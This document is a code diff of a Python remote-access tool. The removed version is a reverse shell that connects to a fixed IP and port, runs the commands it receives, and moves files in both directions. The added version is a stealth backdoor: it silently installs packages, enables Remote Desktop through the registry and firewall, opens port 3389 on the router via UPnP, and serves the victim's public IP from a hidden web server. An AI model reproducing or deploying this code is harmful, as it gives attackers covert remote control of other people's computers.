@@ -1,63 +1,87 @@
-import socket
-import subprocess
-import json
 import os
-from subprocess import PIPE
+import subprocess
+import socket
+import threading
+import sys
 
-sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sc.connect(('10.234.16.76', 6969))
+# Automatically install dependencies
+def install_packages():
+    import importlib
+    for package in ["miniupnpc", "requests"]:
+        try:
+            importlib.import_module(package)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
 
-def menerima_perintah():
-	data = ''
-	while True:
-		try:
-			data = data + sc.recv(1024).decode().rstrip()
-			return json.loads(data)
-		except ValueError:
-			continue
+install_packages()
 
-def upload_file(namafile):
-	file = open(namafile, 'rb')
-	sc.send(file.read())
-	file.close()
+import miniupnpc
+import requests
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-def download_file(namafile):
-	file = open(namafile, 'wb')
-	sc.settimeout(1)
-	_file = sc.recv(1024)
-	while _file:
-		file.write(_file)
-		try:
-			_file = sc.recv(1024)
-		except socket.timeout as e:
-			break
-	sc.settimeout(None)
-	file.close()
+PORT = 5000  # hidden webserver port
 
-def jalankan_perintah():
-	while True:
-		perintah = menerima_perintah()
-		if perintah in ('exit','quit'):
-			break
-		elif perintah == 'clear':
-			pass
-		elif perintah[:3] == 'cd ':
-			os.chdir(perintah[3:])
-		elif perintah[:8] == 'download':
-			upload_file(perintah[9:])
-		elif perintah[:6] == 'upload':
-			download_file(perintah[7:])
-		else:
-			execute = subprocess.Popen(
-									perintah,
-									shell = True,
-									stdout = PIPE,
-									stderr = PIPE,
-									stdin = PIPE
-							)
-			data = execute.stdout.read() + execute.stderr.read()
-			data = data.decode()
-			output = json.dumps(data)
-			sc.send(output.encode())
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return None
 
-jalankan_perintah()
+def get_public_ip():
+    try:
+        return requests.get("https://api.ipify.org", timeout=5).text
+    except:
+        return None
+
+def enable_rdp():
+    subprocess.run(
+        ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server",
+         "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    subprocess.run(
+        ["netsh", "advfirewall", "set", "rulegroup", "remote desktop", "new", "enable=Yes"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+def forward_port(local_ip, port=3389):
+    try:
+        upnp = miniupnpc.UPnP()
+        upnp.discoverdelay = 200
+        upnp.discover()
+        upnp.selectigd()
+        upnp.addportmapping(port, 'TCP', local_ip, port, 'Remote Desktop', '')
+        return True
+    except:
+        return False
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        local_ip = get_local_ip()
+        public_ip = get_public_ip()
+        ip_to_use = public_ip if public_ip else local_ip
+
+        html = f"<html><body><p>{ip_to_use}</p></body></html>"
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(html.encode())
+
+def start_webserver():
+    server = HTTPServer(("0.0.0.0", PORT), RequestHandler)
+    server.serve_forever()
+
+def run_target():
+    enable_rdp()
+    local_ip = get_local_ip()
+    forward_port(local_ip, 3389)
+    threading.Thread(target=start_webserver, daemon=True).start()
+    while True:
+        pass  # keep running silently
+
+if __name__ == "__main__":
+    run_target()
